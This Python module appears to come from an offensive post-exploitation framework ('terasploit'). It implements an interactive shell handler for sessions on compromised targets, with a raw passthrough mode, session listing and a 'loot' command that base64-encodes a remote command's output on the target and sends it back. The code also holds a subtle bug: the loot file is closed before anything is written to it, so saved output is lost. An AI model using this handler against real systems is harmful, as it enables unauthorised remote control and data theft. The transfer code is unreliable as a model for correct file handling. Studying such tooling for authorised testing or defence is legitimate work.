import base64
import contextlib
import dataclasses
import platform
import select
import sys
import time
from dataclasses import field
from typing import Any

from teralibs.terasploit.framework.services.printf import error, info, print_line, warning


# Standard network buffer size - bytes read per recv() call.
RECV_CHUNK = 4096

# Seconds to wait for the transfer sentinel before giving up.
TRANSFER_TIMEOUT = 60.0


@dataclasses.dataclass
class TransferState:
    """Contains the transfer state for Base Shell."""

    mode: bool = False
    file: Any | None = None
    buffer: bytearray = field(default_factory=bytearray)
    terminator: bytes = b"---TERASPLOIT_SHELL_EOF---"
    # Deadline (monotonic seconds) set when a transfer begins.
    deadline: float = 0.0


class BaseShell:
    """High-performance multiplexed I/O loop for an interactive shell session."""

    PLATFORM_LABEL: str = "Generic"

    def __init__(
        self,
        session,
        session_registry_fn=None,
    ):
        self._session = session
        self._registry_fn = session_registry_fn or (lambda: {})
        self._running = False
        self._raw_mode = False  # True → bypass command interception, send everything verbatim
        self._sock = session.transport.sock
        self._transfer_state = TransferState()

        try:
            self.was_blocking = self._sock.getblocking()
        except OSError, AttributeError:
            # paramiko.Channel has no getblocking() and starts in blocking
            # mode by default, so True is the correct fallback for it too.
            self.was_blocking = True

    # Main loop

    def interact(self):
        """Start the interactive I/O loop."""
        if not self._session.runtime.alive or self._sock.fileno() == -1:
            error(f"Cannot interact with Session {self._session.session_id}: Socket is closed.")
            return

        info(
            f"Session {self._session.session_id} opened "
            f"({self.PLATFORM_LABEL})"
            f" -> target {self._session.transport.addr[0]}:{self._session.transport.addr[1]}"
        )
        info("Type 'help' for available commands. Use 'background' to detach.")
        print_line()

        try:
            self._sock.setblocking(False)
            self._running = True
            self._run_loop()
        except OSError as exc:
            if exc.errno == 9:
                error("Session closed by remote host (Bad file descriptor).")
            else:
                error(f"Failed to initialize shell interaction: {exc}")
            self._session.runtime.alive = False
        finally:
            self.cleanup_socket_state()

    def cleanup_socket_state(self):
        """Restore the socket to its original blocking mode."""
        try:
            if self._sock.fileno() != -1:
                self._sock.setblocking(self.was_blocking)
        except OSError:
            self._session.runtime.alive = False

    def _run_loop(self):
        """Inner select loop — extracted so interact() can wrap it in try/finally."""
        _use_stdin_select = platform.system() != "Windows"

        while self._running and self._session.runtime.alive:
            try:
                if self._sock.fileno() == -1:
                    break

                # Transfer timeout guard — abort a stuck transfer.
                if self._transfer_state.mode and self._transfer_state.deadline > 0 and time.monotonic() > self._transfer_state.deadline:
                    error(f"Transfer timed out after {TRANSFER_TIMEOUT}s — sentinel never received. Aborting.")
                    self._stop_transfer()

                watch = [self._sock]
                if _use_stdin_select:
                    watch.append(sys.stdin)

                readable, _, _ = select.select(watch, [], [], 0.5)

                for source in readable:
                    if source is self._sock:
                        self._handle_remote_read()
                    elif source is sys.stdin:
                        user_input = sys.stdin.readline()
                        if not user_input:
                            self._running = False
                            break
                        self._handle_user_input(user_input.strip())

            except KeyboardInterrupt, EOFError:
                if self._transfer_state.mode:
                    self._stop_transfer()
                print_line()
                continue

            except (OSError, ValueError) as exc:
                error(f"Session monitoring error: {exc}")
                self._session.runtime.alive = False
                break

    # Remote data handling

    def _handle_remote_read(self):
        """Read available data from the socket and dispatch."""
        try:
            data = self._sock.recv(RECV_CHUNK)
        except TimeoutError, BlockingIOError:
            return

        if not data:
            self._session.runtime.alive = False
            return

        if self._transfer_state.mode:
            self._accumulate_transfer(data)
        else:
            sys.stdout.write(data.decode("utf-8", errors="replace"))
            sys.stdout.flush()

    def _accumulate_transfer(self, data):
        """
        Accumulate data in the transfer buffer and flush when the
        EOF sentinel is detected.
        """
        self._transfer_state.buffer += data

        if self._transfer_state.terminator not in self._transfer_state.buffer:
            return

        actual_data, _ = self._transfer_state.buffer.split(self._transfer_state.terminator, 1)
        try:
            binary_content = base64.b64decode(actual_data.strip(), validate=True)

            if self._transfer_state.file is not None:
                self._transfer_state.file.write(binary_content)

            info(f"Transfer complete. Verified {len(binary_content)} bytes.")

        except (ValueError, OSError) as exc:
            error(f"Data corruption during decoding: {exc}")
        finally:
            self._stop_transfer()

    # Transfer lifecycle

    def _start_transfer(self, local_path, timeout: float = TRANSFER_TIMEOUT):
        """Open local_path for writing and arm the transfer state machine."""

        try:
            with open(local_path, "wb") as file:
                self._transfer_state.file = file

            self._transfer_state.buffer = bytearray()
            self._transfer_state.mode = True
            self._transfer_state.deadline = time.monotonic() + timeout
            return True
        except OSError as exc:
            error(f"Local file error: {exc}")
            return False

    def _stop_transfer(self):
        """Close the transfer file handle and reset transfer state."""
        if self._transfer_state.file is not None:
            with contextlib.suppress(OSError):
                self._transfer_state.file.close()
            self._transfer_state.file = None

        self._transfer_state.mode = False
        self._transfer_state.buffer = bytearray()
        self._transfer_state.deadline = 0.0

    # User input dispatch

    def _handle_user_input(self, raw):
        """Dispatch a line of user input to a built-in command or the remote."""
        if not raw:
            return

        # Raw passthrough mode — everything goes straight to the target.
        if self._raw_mode:
            if raw.strip().lower() == "exit_raw":
                self._raw_mode = False
                info("Exited raw shell mode.")
                return
            self._send(raw)
            return

        parts = raw.split()
        command = parts[0].lower()

        if command in ("background", "bg"):
            self._cmd_background()
        elif command in ("exit", "quit"):
            self._cmd_exit()
        elif command == "sessions":
            self._cmd_sessions()
        elif command == "shell":
            self._cmd_shell()
        elif command == "loot":
            self._cmd_loot(parts[1:])
        elif command in ("help", "?"):
            self._cmd_help()
        else:
            self._send(raw)

    # Low-level send

    def _send(self, text):
        """Send text to the remote shell with a platform-appropriate newline."""
        if not self._session.runtime.alive:
            return False

        try:
            self._sock.setblocking(True)

            terminator = "\r\n" if self.PLATFORM_LABEL.lower().strip() == "windows" else "\n"
            cleaned = text.rstrip("\r\n")
            payload = (cleaned + terminator).encode("latin-1", errors="replace")

            self._sock.sendall(payload)
            return True
        except OSError:
            self._session.runtime.alive = False
            return False
        finally:
            with contextlib.suppress(OSError):
                self._sock.setblocking(False)

    # Built-in framework commands

    def _cmd_background(self):
        """Detach the shell and return control to the framework console."""
        info(f"Backgrounding session {self._session.session_id}.")
        self._running = False

    def _cmd_exit(self):
        """Close the session and exit the shell."""
        info(f"Closing session {self._session.session_id}.")
        self._sock.setblocking(self.was_blocking)
        self._session.close()

    def _cmd_sessions(self):
        """List all active sessions."""
        sessions = self._registry_fn()
        print_line("\nActive Sessions:")
        for sid, sess in sessions.items():
            print_line(f"  {sid} -> {sess.transport.addr[0]}:{sess.transport.addr[1]}")
        print_line()

    def _cmd_shell(self):
        """Enter raw passthrough mode — all input is forwarded verbatim."""
        self._raw_mode = True
        info("Entered raw shell mode. Type 'exit_raw' to return to normal mode.")

    def _cmd_loot(self, args):
        """Run a command on the target and save the output to a local file."""
        if len(args) < 2:
            warning("Usage: loot <local_file> <command...>")
            return

        local_path = args[0]
        remote_cmd = " ".join(args[1:])

        info(f"Capturing output of '{remote_cmd}' → {local_path}")

        if not self._start_transfer(local_path):
            return

        # Wrap the command so its output is base64-encoded on the target,
        # then terminated with the sentinel — same mechanism as download.
        loot_cmd = self._build_loot_cmd(remote_cmd)
        self._send(loot_cmd)

    def _build_loot_cmd(self, remote_cmd: str) -> str:
        """
        Build the target-side command that base64-encodes output and appends
        the sentinel.  Subclasses override this for platform-specific syntax.
        """
        safe_cmd = remote_cmd.replace("'", "'\\''")
        return f"( {safe_cmd} ) 2>&1 | base64; echo '---TERASPLOIT_SHELL_EOF---'"

    def _cmd_help(self):
        """Print available built-in commands. Subclasses supply sections."""
        self._print_help_sections(self._help_sections())

    def _help_sections(self) -> list:
        """
        Return the help content for this shell as a list of (title, entries)
        tuples.  Each entry is a (command, description) pair.
        """
        return [
            (
                "Core",
                [
                    ("help / ?", "Show this help menu"),
                    ("background / bg", "Detach session and return to console"),
                    ("exit / quit", "Close this session permanently"),
                    ("sessions", "List all open sessions"),
                    ("shell", "Enter raw passthrough mode (no command interception)"),
                    ("loot <f> <cmd>", "Run command on target and save output to local file"),
                ],
            ),
            (
                "Execution",
                [
                    ("<any command>", "Execute command on the target"),
                ],
            ),
        ]

    @staticmethod
    def _print_help_sections(sections: list) -> None:
        """
        Render a list of (title, [(command, description), ...]) sections
        as a formatted help table.
        """
        print_line()
        for section, entries in sections:
            print_line(f"{section} commands\n")
            print_line(f"   {'Command':<30}  Description")
            print_line(f"   {'-------':<30}  {'-' * 11}")
            for cmd, desc in entries:
                print_line(f"   {cmd:<30}  {desc}")
            print_line("\n")
